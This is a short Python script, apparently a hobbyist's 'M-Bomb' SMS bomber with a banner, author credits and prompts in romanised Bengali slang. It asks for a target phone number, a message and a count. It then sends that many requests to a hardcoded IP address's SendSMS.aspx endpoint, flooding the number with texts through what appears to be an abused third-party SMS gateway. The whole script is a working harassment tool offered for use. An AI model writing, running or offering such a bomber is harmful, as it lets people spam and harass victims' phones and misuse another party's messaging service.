import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""

    __  __        ____                  _     
 |  \/  |      |  _ \                | |    
 | \  / |______| |_) | ___  _ __ ___ | |__  
 | |\/| |______|  _ < / _ \| '_ ` _ \| '_ \ 
 | |  | |      | |_) | (_) | | | | | | |_) |
 |_|  |_|      |____/ \___/|_| |_| |_|_.__/  
                                                                  """+end)

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
purple="\033[0;35m"
cyan = "\033[96m"
end = '\033[0m'
print ("\033[35m")

print ("	Mojibrsm...!!  My User Bulk Sms Sender System!  You're welcome  ")


print ("""
          
                       
╔═══════════════════════=══=════════╗
	 Author   : MoJiBor RaHaMaN Sm
  	 Facebook : MoJiB Rsm       								
 	 CircLe   : BaNgLarBaG
 	 YouTube  : It's Mojib  
 	    
╚═══════════════════==══════════════╝
       
 
  
  
""")

number  = str(input("[>] KiRe. Age Number De: "))

sms  = str(input("[>] Kire, Sms Lekh Na Re Beta: ")) 

amount = int(input("[>] Sms KoiiTa Pathabi Amount Lekh: "))

url = "http://27.131.15.12/sdpdcg/SendSMS.aspx?sMSISDN=88"+number+"&sMsg="+sms+"&sShortcode=21200"

for i in range(amount):
	try:
		
		resp = requests.get(url)
		
		print(str (i+1)+" Sms Geche \n")
		
	except:
		print ("Tur Mobile e Network Nai,,, Network Ache Ei Rkm Zaiga Za")
